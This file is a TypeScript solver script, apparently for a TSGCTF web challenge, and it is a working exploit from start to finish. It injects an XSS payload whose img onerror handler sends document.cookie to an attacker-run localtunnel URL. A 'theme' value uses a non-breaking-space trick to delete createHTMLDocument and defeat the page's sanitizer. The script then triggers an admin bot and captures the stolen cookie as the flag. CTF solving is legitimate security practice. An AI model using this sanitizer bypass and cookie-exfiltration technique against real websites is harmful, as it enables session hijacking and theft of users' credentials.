import axios from 'axios';
import localtunnel from 'localtunnel';
import express from 'express';
import * as qs from 'querystring';
import {Server} from 'http';

if (process.argv.length !== 4) {
	console.error('Usage: ts-node solver.ts <host> <port>');
	process.exit(1);
}

const [, , host, port] = process.argv;

(async () => {
	const app = express();
	const flagPromise = new Promise((resolve) => {
		app.get('/report', (req, res) => {
			res.send('ok');
			resolve(req.originalUrl.split('cookie=')[1]);
		});
	});

	const server = await new Promise<Server>((resolve) => {
		const server = app.listen(3000, () => resolve(server));
	});
	console.log('server listening');

	const tunnel = await localtunnel({port: 3000});
	console.log(`Tunnel created on ${tunnel.url}`);

	process.on('SIGINT', () => {
		tunnel.close();
		server.close();
		process.exit(1);
	});

	const url = new URL('/report', tunnel.url).toString();
	const res1 = await axios({
		method: 'post',
		url: `http://${host}:${port}/`,
		headers: {
			'content-type': 'application/x-www-form-urlencoded',
		},
		data: qs.encode({
			theme: 'x onerror=delete\xA0document.implementation.__proto__.createHTMLDocument ',
			title: 'aa',
			body: `<img src="x" onerror="location.href = '${url}?' + document.cookie">`,
		}),
		maxRedirects: 0,
		validateStatus: null,
	});

	const id = res1.headers.location.slice(1);
	console.log(`Submitted post (id = ${id})`);

	const res2 = await axios({
		method: 'post',
		url: `http://${host}:${port}/${id}`,
	});
	console.log(`Report result: ${res2.data}`);

	const flag = (await flagPromise) as string;
	console.log(`Flag: ${flag}`);

	if (!flag.includes('TSGCTF{')) {
		process.exit(1);
	}

	setTimeout(() => {
		// force exit
		process.exit(0);
	}, 10 * 1000);

	tunnel.close();
	server.close();
})();
